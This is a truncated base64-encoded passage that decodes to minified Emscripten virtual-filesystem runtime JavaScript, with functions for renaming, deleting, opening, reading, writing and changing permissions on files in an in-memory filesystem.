b3IoZXJyKX1lcnI9bmV3X25vZGU/RlMubWF5RGVsZXRlKG5ld19kaXIsbmV3X25hbWUsaXNkaXIpOkZTLm1heUNyZWF0ZShuZXdfZGlyLG5ld19uYW1lKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9aWYoIW9sZF9kaXIubm9kZV9vcHMucmVuYW1lKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9aWYoRlMuaXNNb3VudHBvaW50KG9sZF9ub2RlKXx8bmV3X25vZGUmJkZTLmlzTW91bnRwb2ludChuZXdfbm9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKX1pZihuZXdfZGlyIT09b2xkX2Rpcil7ZXJyPUZTLm5vZGVQZXJtaXNzaW9ucyhvbGRfZGlyLCJ3Iik7aWYoZXJyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpfX10cnl7aWYoRlMudHJhY2tpbmdEZWxlZ2F0ZVsid2lsbE1vdmVQYXRoIl0pe0ZTLnRyYWNraW5nRGVsZWdhdGVbIndpbGxNb3ZlUGF0aCJdKG9sZF9wYXRoLG5ld19wYXRoKX19Y2F0Y2goZSl7Y29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbXCd3aWxsTW92ZVBhdGhcJ10oXCciK29sZF9wYXRoKyJcJywgXCciK25ld19wYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9RlMuaGFzaFJlbW92ZU5vZGUob2xkX25vZGUpO3RyeXtvbGRfZGlyLm5vZGVfb3BzLnJlbmFtZShvbGRfbm9kZSxuZXdfZGlyLG5ld19uYW1lKX1jYXRjaChlKXt0aHJvdyBlfWZpbmFsbHl7RlMuaGFzaEFkZE5vZGUob2xkX25vZGUpfXRyeXtpZihGUy50cmFja2luZ0RlbGVnYXRlWyJvbk1vdmVQYXRoIl0pRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25Nb3ZlUGF0aCJdKG9sZF9wYXRoLG5ld19wYXRoKX1jYXRjaChlKXtjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVtcJ29uTW92ZVBhdGhcJ10oXCciK29sZF9wYXRoKyJcJywgXCciK25ld19wYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9fSkscm1kaXI6KGZ1bmN0aW9uKHBhdGgpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtwYXJlbnQ6dHJ1ZX0pO3ZhciBwYXJlbnQ9bG9va3VwLm5vZGU7dmFyIG5hbWU9UEFUSC5iYXNlbmFtZShwYXRoKTt2YXIgbm9kZT1GUy5sb29rdXBOb2RlKHBhcmVudCxuYW1lKTt2YXIgZXJyPUZTLm1heURlbGV0ZShwYXJlbnQsbmFtZSx0cnVlKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9aWYoIXBhcmVudC5ub2RlX29wcy5ybWRpcil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfWlmKEZTLmlzTW91bnRwb2ludChub2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJVU1kpfXRyeXtpZihGUy50cmFja2luZ0RlbGVnYXRlWyJ3aWxsRGVsZXRlUGF0aCJdKXtGUy50cmFja2luZ0RlbGVnYXRlWyJ3aWxsRGVsZXRlUGF0aCJdKHBhdGgpfX1jYXRjaChlKXtjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVtcJ3dpbGxEZWxldGVQYXRoXCddKFwnIitwYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9cGFyZW50Lm5vZGVfb3BzLnJtZGlyKHBhcmVudCxuYW1lKTtGUy5kZXN0cm95Tm9kZShub2RlKTt0cnl7aWYoRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25EZWxldGVQYXRoIl0pRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25EZWxldGVQYXRoIl0ocGF0aCl9Y2F0Y2goZSl7Y29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbXCdvbkRlbGV0ZVBhdGhcJ10oXCciK3BhdGgrIlwnKSB0aHJldyBhbiBleGNlcHRpb246ICIrZS5tZXNzYWdlKX19KSxyZWFkZGlyOihmdW5jdGlvbihwYXRoKXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OnRydWV9KTt2YXIgbm9kZT1sb29rdXAubm9kZTtpZighbm9kZS5ub2RlX29wcy5yZWFkZGlyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URElSKX1yZXR1cm4gbm9kZS5ub2RlX29wcy5yZWFkZGlyKG5vZGUpfSksdW5saW5rOihmdW5jdGlvbihwYXRoKXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7cGFyZW50OnRydWV9KTt2YXIgcGFyZW50PWxvb2t1cC5ub2RlO3ZhciBuYW1lPVBBVEguYmFzZW5hbWUocGF0aCk7dmFyIG5vZGU9RlMubG9va3VwTm9kZShwYXJlbnQsbmFtZSk7dmFyIGVycj1GUy5tYXlEZWxldGUocGFyZW50LG5hbWUsZmFsc2UpO2lmKGVycil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyKX1pZighcGFyZW50Lm5vZGVfb3BzLnVubGluayl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfWlmKEZTLmlzTW91bnRwb2ludChub2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJVU1kpfXRyeXtpZihGUy50cmFja2luZ0RlbGVnYXRlWyJ3aWxsRGVsZXRlUGF0aCJdKXtGUy50cmFja2luZ0RlbGVnYXRlWyJ3aWxsRGVsZXRlUGF0aCJdKHBhdGgpfX1jYXRjaChlKXtjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVtcJ3dpbGxEZWxldGVQYXRoXCddKFwnIitwYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9cGFyZW50Lm5vZGVfb3BzLnVubGluayhwYXJlbnQsbmFtZSk7RlMuZGVzdHJveU5vZGUobm9kZSk7dHJ5e2lmKEZTLnRyYWNraW5nRGVsZWdhdGVbIm9uRGVsZXRlUGF0aCJdKUZTLnRyYWNraW5nRGVsZWdhdGVbIm9uRGVsZXRlUGF0aCJdKHBhdGgpfWNhdGNoKGUpe2NvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlW1wnb25EZWxldGVQYXRoXCddKFwnIitwYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9fSkscmVhZGxpbms6KGZ1bmN0aW9uKHBhdGgpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoKTt2YXIgbGluaz1sb29rdXAubm9kZTtpZighbGluayl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKX1pZighbGluay5ub2RlX29wcy5yZWFkbGluayl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1yZXR1cm4gUEFUSC5yZXNvbHZlKEZTLmdldFBhdGgobGluay5wYXJlbnQpLGxpbmsubm9kZV9vcHMucmVhZGxpbmsobGluaykpfSksc3RhdDooZnVuY3Rpb24ocGF0aCxkb250Rm9sbG93KXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OiFkb250Rm9sbG93fSk7dmFyIG5vZGU9bG9va3VwLm5vZGU7aWYoIW5vZGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCl9aWYoIW5vZGUubm9kZV9vcHMuZ2V0YXR0cil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfXJldHVybiBub2RlLm5vZGVfb3BzLmdldGF0dHIobm9kZSl9KSxsc3RhdDooZnVuY3Rpb24ocGF0aCl7cmV0dXJuIEZTLnN0YXQocGF0aCx0cnVlKX0pLGNobW9kOihmdW5jdGlvbihwYXRoLG1vZGUsZG9udEZvbGxvdyl7dmFyIG5vZGU7aWYodHlwZW9mIHBhdGg9PT0ic3RyaW5nIil7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse2ZvbGxvdzohZG9udEZvbGxvd30pO25vZGU9bG9va3VwLm5vZGV9ZWxzZXtub2RlPXBhdGh9aWYoIW5vZGUubm9kZV9vcHMuc2V0YXR0cil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfW5vZGUubm9kZV9vcHMuc2V0YXR0cihub2RlLHttb2RlOm1vZGUmNDA5NXxub2RlLm1vZGUmfjQwOTUsdGltZXN0YW1wOkRhdGUubm93KCl9KX0pLGxjaG1vZDooZnVuY3Rpb24ocGF0aCxtb2RlKXtGUy5jaG1vZChwYXRoLG1vZGUsdHJ1ZSl9KSxmY2htb2Q6KGZ1bmN0aW9uKGZkLG1vZGUpe3ZhciBzdHJlYW09RlMuZ2V0U3RyZWFtKGZkKTtpZighc3RyZWFtKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERil9RlMuY2htb2Qoc3RyZWFtLm5vZGUsbW9kZSl9KSxjaG93bjooZnVuY3Rpb24ocGF0aCx1aWQsZ2lkLGRvbnRGb2xsb3cpe3ZhciBub2RlO2lmKHR5cGVvZiBwYXRoPT09InN0cmluZyIpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtmb2xsb3c6IWRvbnRGb2xsb3d9KTtub2RlPWxvb2t1cC5ub2RlfWVsc2V7bm9kZT1wYXRofWlmKCFub2RlLm5vZGVfb3BzLnNldGF0dHIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX1ub2RlLm5vZGVfb3BzLnNldGF0dHIobm9kZSx7dGltZXN0YW1wOkRhdGUubm93KCl9KX0pLGxjaG93bjooZnVuY3Rpb24ocGF0aCx1aWQsZ2lkKXtGUy5jaG93bihwYXRoLHVpZCxnaWQsdHJ1ZSl9KSxmY2hvd246KGZ1bmN0aW9uKGZkLHVpZCxnaWQpe3ZhciBzdHJlYW09RlMuZ2V0U3RyZWFtKGZkKTtpZighc3RyZWFtKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERil9RlMuY2hvd24oc3RyZWFtLm5vZGUsdWlkLGdpZCl9KSx0cnVuY2F0ZTooZnVuY3Rpb24ocGF0aCxsZW4pe2lmKGxlbjwwKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfXZhciBub2RlO2lmKHR5cGVvZiBwYXRoPT09InN0cmluZyIpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtmb2xsb3c6dHJ1ZX0pO25vZGU9bG9va3VwLm5vZGV9ZWxzZXtub2RlPXBhdGh9aWYoIW5vZGUubm9kZV9vcHMuc2V0YXR0cil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfWlmKEZTLmlzRGlyKG5vZGUubW9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJU0RJUil9aWYoIUZTLmlzRmlsZShub2RlLm1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfXZhciBlcnI9RlMubm9kZVBlcm1pc3Npb25zKG5vZGUsInciKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9bm9kZS5ub2RlX29wcy5zZXRhdHRyKG5vZGUse3NpemU6bGVuLHRpbWVzdGFtcDpEYXRlLm5vdygpfSl9KSxmdHJ1bmNhdGU6KGZ1bmN0aW9uKGZkLGxlbil7dmFyIHN0cmVhbT1GUy5nZXRTdHJlYW0oZmQpO2lmKCFzdHJlYW0pe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKX1pZigoc3RyZWFtLmZsYWdzJjIwOTcxNTUpPT09MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1GUy50cnVuY2F0ZShzdHJlYW0ubm9kZSxsZW4pfSksdXRpbWU6KGZ1bmN0aW9uKHBhdGgsYXRpbWUsbXRpbWUpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtmb2xsb3c6dHJ1ZX0pO3ZhciBub2RlPWxvb2t1cC5ub2RlO25vZGUubm9kZV9vcHMuc2V0YXR0cihub2RlLHt0aW1lc3RhbXA6TWF0aC5tYXgoYXRpbWUsbXRpbWUpfSl9KSxvcGVuOihmdW5jdGlvbihwYXRoLGZsYWdzLG1vZGUsZmRfc3RhcnQsZmRfZW5kKXtpZihwYXRoPT09IiIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCl9ZmxhZ3M9dHlwZW9mIGZsYWdzPT09InN0cmluZyI/RlMubW9kZVN0cmluZ1RvRmxhZ3MoZmxhZ3MpOmZsYWdzO21vZGU9dHlwZW9mIG1vZGU9PT0idW5kZWZpbmVkIj80Mzg6bW9kZTtpZihmbGFncyY2NCl7bW9kZT1tb2RlJjQwOTV8MzI3Njh9ZWxzZXttb2RlPTB9dmFyIG5vZGU7aWYodHlwZW9mIHBhdGg9PT0ib2JqZWN0Iil7bm9kZT1wYXRofWVsc2V7cGF0aD1QQVRILm5vcm1hbGl6ZShwYXRoKTt0cnl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse2ZvbGxvdzohKGZsYWdzJjEzMTA3Mil9KTtub2RlPWxvb2t1cC5ub2RlfWNhdGNoKGUpe319dmFyIGNyZWF0ZWQ9ZmFsc2U7aWYoZmxhZ3MmNjQpe2lmKG5vZGUpe2lmKGZsYWdzJjEyOCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUVYSVNUKX19ZWxzZXtub2RlPUZTLm1rbm9kKHBhdGgsbW9kZSwwKTtjcmVhdGVkPXRydWV9fWlmKCFub2RlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpfWlmKEZTLmlzQ2hyZGV2KG5vZGUubW9kZSkpe2ZsYWdzJj1+NTEyfWlmKGZsYWdzJjY1NTM2JiYhRlMuaXNEaXIobm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVERJUil9aWYoIWNyZWF0ZWQpe3ZhciBlcnI9RlMubWF5T3Blbihub2RlLGZsYWdzKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9fWlmKGZsYWdzJjUxMil7RlMudHJ1bmNhdGUobm9kZSwwKX1mbGFncyY9figxMjh8NTEyKTt2YXIgc3RyZWFtPUZTLmNyZWF0ZVN0cmVhbSh7bm9kZTpub2RlLHBhdGg6RlMuZ2V0UGF0aChub2RlKSxmbGFnczpmbGFncyxzZWVrYWJsZTp0cnVlLHBvc2l0aW9uOjAsc3RyZWFtX29wczpub2RlLnN0cmVhbV9vcHMsdW5nb3R0ZW46W10sZXJyb3I6ZmFsc2V9LGZkX3N0YXJ0LGZkX2VuZCk7aWYoc3RyZWFtLnN0cmVhbV9vcHMub3Blbil7c3RyZWFtLnN0cmVhbV9vcHMub3BlbihzdHJlYW0pfWlmKE1vZHVsZVsibG9nUmVhZEZpbGVzIl0mJiEoZmxhZ3MmMSkpe2lmKCFGUy5yZWFkRmlsZXMpRlMucmVhZEZpbGVzPXt9O2lmKCEocGF0aCBpbiBGUy5yZWFkRmlsZXMpKXtGUy5yZWFkRmlsZXNbcGF0aF09MTtNb2R1bGVbInByaW50RXJyIl0oInJlYWQgZmlsZTogIitwYXRoKX19dHJ5e2lmKEZTLnRyYWNraW5nRGVsZWdhdGVbIm9uT3BlbkZpbGUiXSl7dmFyIHRyYWNraW5nRmxhZ3M9MDtpZigoZmxhZ3MmMjA5NzE1NSkhPT0xKXt0cmFja2luZ0ZsYWdzfD1GUy50cmFja2luZy5vcGVuRmxhZ3MuUkVBRH1pZigoZmxhZ3MmMjA5NzE1NSkhPT0wKXt0cmFja2luZ0ZsYWdzfD1GUy50cmFja2luZy5vcGVuRmxhZ3MuV1JJVEV9RlMudHJhY2tpbmdEZWxlZ2F0ZVsib25PcGVuRmlsZSJdKHBhdGgsdHJhY2tpbmdGbGFncyl9fWNhdGNoKGUpe2NvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlW1wnb25PcGVuRmlsZVwnXShcJyIrcGF0aCsiXCcsIGZsYWdzKSB0aHJldyBhbiBleGNlcHRpb246ICIrZS5tZXNzYWdlKX1yZXR1cm4gc3RyZWFtfSksY2xvc2U6KGZ1bmN0aW9uKHN0cmVhbSl7aWYoc3RyZWFtLmdldGRlbnRzKXN0cmVhbS5nZXRkZW50cz1udWxsO3RyeXtpZihzdHJlYW0uc3RyZWFtX29wcy5jbG9zZSl7c3RyZWFtLnN0cmVhbV9vcHMuY2xvc2Uoc3RyZWFtKX19Y2F0Y2goZSl7dGhyb3cgZX1maW5hbGx5e0ZTLmNsb3NlU3RyZWFtKHN0cmVhbS5mZCl9fSksbGxzZWVrOihmdW5jdGlvbihzdHJlYW0sb2Zmc2V0LHdoZW5jZSl7aWYoIXN0cmVhbS5zZWVrYWJsZXx8IXN0cmVhbS5zdHJlYW1fb3BzLmxsc2Vlayl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVNQSVBFKX1zdHJlYW0ucG9zaXRpb249c3RyZWFtLnN0cmVhbV9vcHMubGxzZWVrKHN0cmVhbSxvZmZzZXQsd2hlbmNlKTtzdHJlYW0udW5nb3R0ZW49W107cmV0dXJuIHN0cmVhbS5wb3NpdGlvbn0pLHJlYWQ6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbil7aWYobGVuZ3RoPDB8fHBvc2l0aW9uPDApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9aWYoKHN0cmVhbS5mbGFncyYyMDk3MTU1KT09PTEpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKX1pZihGUy5pc0RpcihzdHJlYW0ubm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlTRElSKX1pZighc3RyZWFtLnN0cmVhbV9vcHMucmVhZCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX12YXIgc2Vla2luZz10cnVlO2lmKHR5cGVvZiBwb3NpdGlvbj09PSJ1bmRlZmluZWQiKXtwb3NpdGlvbj1zdHJlYW0ucG9zaXRpb247c2Vla2luZz1mYWxzZX1lbHNlIGlmKCFzdHJlYW0uc2Vla2FibGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVTUElQRSl9dmFyIGJ5dGVzUmVhZD1zdHJlYW0uc3RyZWFtX29wcy5yZWFkKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbik7aWYoIXNlZWtpbmcpc3RyZWFtLnBvc2l0aW9uKz1ieXRlc1JlYWQ7cmV0dXJuIGJ5dGVzUmVhZH0pLHdyaXRlOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24sY2FuT3duKXtpZihsZW5ndGg8MHx8cG9zaXRpb248MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1pZigoc3RyZWFtLmZsYWdzJjIwOTcxNTUpPT09MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpfWlmKEZTLmlzRGlyKHN0cmVhbS5ub2RlLm1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSVNESVIpfWlmKCFzdHJlYW0uc3RyZWFtX29wcy53cml0ZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1pZihzdHJlYW0uZmxhZ3MmMTAyNCl7RlMubGxzZWVrKHN0cmVhbSwwLDIpfXZhciBzZWVraW5nPXRydWU7aWYodHlwZW9mIHBvc2l0aW9uPT09InVuZGVmaW5lZCIpe3Bvc2l0aW9uPXN0cmVhbS5wb3NpdGlvbjtzZWVraW5nPWZhbHNlfWVsc2UgaWYoIXN0cmVhbS5zZWVrYWJsZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVNQSVBFKX12YXIgYnl0ZXNXcml0dGVuPXN0cmVhbS5zdHJlYW1fb3BzLndyaXRlKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbixjYW5Pd24pO2lmKCFzZWVraW5nKXN0cmVhbS5wb3NpdGlvbis9Ynl0ZXNXcml0dGVuO3RyeXtpZihzdHJlYW0ucGF0aCYmRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25Xcml0ZVRvRmlsZSJdKUZTLnRyYWNraW5nRGVsZWdhdGVbIm9uV3JpdGVUb0ZpbGUiXShzdHJlYW0ucGF0aCl9Y2F0Y2goZSl7Y29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbXCdvbldyaXRlVG9GaWxlXCddKFwnIitwYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9cmV0dXJuIGJ5dGVzV3JpdHRlbn0pLGFsbG9jYXRlOihmdW5jdGlvbihzdHJlYW0sb2Zmc2V0LGxlbmd0aCl7aWYob2Zmc2V0PDB8fGxlbmd0aDw9MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1pZigoc3RyZWFtLmZsYWdzJjIwOTcxNTUpPT09MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpfWlmKCFGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkmJiFGUy5pc0RpcihzdHJlYW0ubm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PREVWKX1pZighc3RyZWFtLnN0cmVhbV9vcHMuYWxsb2NhdGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVPUE5PVFNVUFApfXN0cmVhbS5zdHJlYW1fb3BzLmFsbG9jYXRlKHN0cmVhbSxvZmZzZXQsbGVuZ3RoKX0pLG1tYXA6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbixwcm90LGZsYWdzKXtpZigoc3RyZWFtLmZsYWdzJjIwOTcxNTUpPT09MSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUFDQ0VTKX1pZighc3RyZWFtLnN0cmVhbV9vcHMubW1hcCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PREVWKX1yZXR1cm4gc3RyZWFtLnN0cmVhbV9vcHMubW1hcChzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24scHJvdCxmbGFncyl9KSxtc3luYzooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLG1tYXBGbGFncyl7aWYoIXN0cmVhbXx8IXN0cmVhbS5zdHJlYW1fb3BzLm1zeW5jKXtyZXR1cm4gMH1yZXR1cm4gc3RyZWFtLnN0cmVhbV9vcHMubXN5bmMoc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLG1tYXBGbGFncyl9KSxtdW5tYXA6KGZ1bmN0aW9uKHN0cmVhbSl7cmV0dXJuIDB9KSxpb2N0bDooZnVuY3Rpb24oc3RyZWFtLGNtZCxhcmcpe2lmKCFzdHJlYW0uc3RyZWFtX29wcy5pb2N0bCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVFRZKX1yZXR1cm4gc3RyZWFtLnN0cmVhbV9vcHMuaW9jdGwoc3RyZWFtLGNtZCxhcmcpfSkscmVhZEZpbGU6KGZ1bmN0aW9uKHBhdGgsb3B0cyl7b3B0cz1vcHRzfHx7fTtvcHRzLmZsYWdzPW9wdHMuZmxhZ3N8fCJyIjtvcHRzLmVuY29kaW5nPW9wdHMuZW5jb2Rpbmd8fCJiaW5hcnkiO2lmKG9wdHMuZW5jb2RpbmchPT0idXRmOCImJm9wdHMuZW5jb2RpbmchPT0iYmluYXJ5Iil7dGhyb3cgbmV3IEVycm9yKFwnSW52YWxpZCBlbmNvZGluZyB0eXBlICJcJytvcHRzLmVuY29kaW5nK1wnIlwnKX12YXIgcmV0O3ZhciBzdHJlYW09RlMub3BlbihwYXRoLG9wdHMuZmxhZ3MpO3ZhciBzdGF0PUZTLnN0YXQocGF0aCk7dmFyIGxlbmd0aD1zdGF0LnNpemU7dmFyIGJ1Zj1uZXcgVWludDhBcnJheShsZW5ndGgpO0ZTLnJlYWQoc3RyZWFtLGJ1ZiwwLGxlbmd0aCwwKTtpZihvcHRzLmVuY29kaW5nPT09InV0ZjgiKXtyZXQ9VVRGOEFycmF5VG9TdHJpbmcoYnVmLDApfWVsc2UgaWYob3B0cy5lbmNvZGluZz09PSJiaW5hcnkiKXtyZXQ9YnVmfUZTLmNsb3NlKHN0cmVhbSk7cmV0dXJuIHJldH0pLHdyaXRlRmlsZTooZnVuY3Rpb24ocGF0aCxkYXRhLG9wdHMpe29wdHM9b3B0c3x8e307b3B0cy5mbGFncz1vcHRzLmZsYWdzfHwidyI7b3B0cy5lbmNvZGluZz1vcHRzLmVuY29kaW5nfHwidXRmOCI7aWYob3B0cy5lbmNvZGluZyE9PSJ1dGY4IiYmb3B0cy5lbmNvZGluZyE9PSJiaW5hcnkiKXt0aHJvdyBuZXcgRXJyb3IoXCdJbnZhbGlkIGVuY29kaW5nIHR5cGUgIlwnK29wdHMuZW5jb2RpbmcrXCciXCcpfXZhciBzdHJlYW09RlMub3BlbihwYXRoLG9wdHMuZmxhZ3Msb3B0cy5tb2RlKTtpZihvcHRzLmVuY29kaW5nPT09InV0ZjgiKXt2YXIgYnVmPW5ldyBVaW50OEFycmF5KGxlbmd0aEJ5dGVzVVRGOChkYXRhKSsxKTt2YXIgYWN0dWFsTnVtQnl0ZXM9c3RyaW5nVG9VVEY4QXJyYXkoZGF0YSxidWYsMCxidWYubGVuZ3RoKTtGUy53cml0ZShzdHJlYW0sYnVmLDAsYWN0dWFsTnVtQnl0ZXMsMCxvcHRzLmNhbk93bil9ZWxzZSBpZihvcHRzLmVuY29kaW5nPT09ImJpbmFyeSIpe0ZTLndyaXRlKHN0cmVhbSxkYXRhLDAsZGF0YS5sZW5ndGgsMCxvcHRzLmNhbk93bil9RlMuY2xvc2Uoc3RyZWFtKX0pLGN3ZDooZnVuY3Rpb24oKXtyZXR1cm4gRlMuY3VycmVudFBhdGh9KSxjaGRpcjooZnVuY3Rpb24ocGF0aCl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse2ZvbGxvdzp0cnVlfSk7aWYobG9va3VwLm5vZGU9PT1udWxsKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpfWlmKCFGUy5pc0Rpcihsb29rdXAubm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVERJUil9dmFyIGVycj1GUy5ub2RlUGVybWlzc2lvbnMobG9va3VwLm5vZGUsIngiKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9RlMuY3VycmVudFBhdGg9bG9va3VwLnBhdGh9KSxjcmVhdGVEZWZhdWx0RGlyZWN0b3JpZXM6KGZ1bmN0aW9uKCl7RlMubWtkaXIoIi90bXAiKTtGUy5ta2RpcigiL2hvbWUiKTtGUy5ta2RpcigiL2hvbWUvd2ViX3VzZXIiKX0pLGNyZWF0ZURlZmF1bHREZXZpY2VzOihmdW5jdGlvbigpe0ZTLm1rZGlyKCIvZGV2Iik7RlMucmVnaXN0ZXJEZXZpY2UoRlMubWFrZWRldigxLDMpLHtyZWFkOihmdW5jdGlvbigpe3JldHVybiAwfSksd3JpdGU6KGZ1bmN0aW9uKHN0cmVhbSxidW